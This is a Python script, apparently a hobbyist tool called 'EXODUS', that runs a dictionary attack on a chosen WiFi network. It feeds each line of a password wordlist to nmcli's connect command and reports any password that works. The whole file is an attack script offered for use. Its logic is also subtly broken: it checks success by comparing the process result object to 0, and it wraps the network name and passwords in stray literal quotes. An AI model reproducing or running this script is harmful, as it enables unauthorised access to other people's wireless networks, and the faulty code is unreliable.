#!/usr/bin/python3

# ////////// works for now ///////////////

# ////////// needs more visual effects ///////

import sys
import os
import time
import subprocess
from colorama import Fore, Style, init

os.system("nmcli device wifi")

print("___ Enter the SSID ___ \n")
ssid_in = input("SSID:")
ssid = f"\"{ssid_in}\""

def pas():
	with open ("passwords.txt","r") as f :
		for line in f:
		    yield line.strip()
banner = f"""
{Fore.BLUE}  _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  

       {Fore.GREEN}|   {Fore.CYAN}E   {Fore.GREEN}|   {Fore.CYAN}X   {Fore.GREEN}|   {Fore.CYAN}O   {Fore.GREEN}|   {Fore.CYAN}D   {Fore.GREEN}|   {Fore.CYAN}U   {Fore.GREEN}|   {Fore.CYAN}S   {Fore.GREEN}|  
{Fore.BLUE}  _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  

  {Fore.YELLOW}>>> {Fore.MAGENTA}EXODUS STARTING {Fore.YELLOW}<<<

{Fore.WHITE}
\n"""
								
for i in banner:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.01)
    
time.sleep(0.02)
								
pswd_lst = pas()

for pswd in pswd_lst:

    if len(pswd) < 8:
        continue
    
    try:
	    pswd = f"\"{pswd}"
	    cmd = ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', pswd]
	    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)


	    print("trying : " + pswd)
	    time.sleep(2)
	    
	    if (result == 0):
	        print(f"{Fore.GREEN}{Style.BRIGHT}Password Obtained {pswd}")
	        break
	        
	    else:
	        print(f"-- Incorrect password {pswd}")
	        
    except Exception as e:
        print("+++ == AN ERROR OCCURED == +++")
        print(f"{e}")
        break

end_msg = " ___ BRUTEFORCE completed ___ "

for i in end_msg:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.05)
    



# The comment i have given below is not a mistake i intend to keep this comment forever for personal reasons


# Nadeem's comment









